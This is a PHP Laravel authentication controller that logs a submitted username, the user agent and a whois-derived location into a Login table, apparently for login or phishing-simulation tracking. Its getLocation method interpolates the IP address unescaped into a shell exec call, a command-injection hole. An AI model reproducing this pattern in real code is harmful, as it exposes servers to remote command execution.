<?php

namespace App\Http\Controllers;

use App\Helpers\AppHelper;
use App\Helpers\AuthTranslationData as HelpersAuthTranslationData;
use App\Helpers\TranslationHelper;
use App\Models\Hash;
use App\Models\Login;
use Error;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;

class AuthController extends BaseController
{
    public function index(Request $request)
    {
        $lang = AppHelper::getLang($request);
        $translation = $this::getTranslationData($lang);

        return view('auth')->with([
            'lang' => $lang,
            'translation' => $translation,
        ]);
    }

    public function store(Request $request)
    {
        $username = $request->get('credential_0');
        $userAgent = $request->userAgent();
        $ipAddress = $request->getIp() ?? $request->ip();
        $geolocation = $this->getLocation($ipAddress);
        $hashId = Hash::where('username', '=', $username)
            ->get()
            ->pluck('id')
            ->first();

        Login::create([
            'username' => $username,
            'user_agent' => $userAgent,
            'geolocation' => $geolocation,
            'created_at' => now(),
            'updated_at' => now(),
            'hash_id' => $hashId,
        ]);

        return view('success')->with(['username' => $username]);
    }

    private function getLocation(string $ipAddress) : string
    {
        $output = [];

        try {
            $output[] = exec("whois {$ipAddress} | grep address", $output);
        } catch(Error $e) {}

        return $output ? implode(' |*| ', $output) : $ipAddress;
    }

    private static function getTranslationData(string $lang) : HelpersAuthTranslationData
    {
        switch ($lang) {
            case 'en':
                return TranslationHelper::getEnglishAuth(); break;
            case 'cs':
                return TranslationHelper::getCzechAuth(); break;
            case 'sk':
                return TranslationHelper::getSlovakianAuth(); break;
            default:
                return TranslationHelper::getCzechAuth(); break;
        }
    }
}
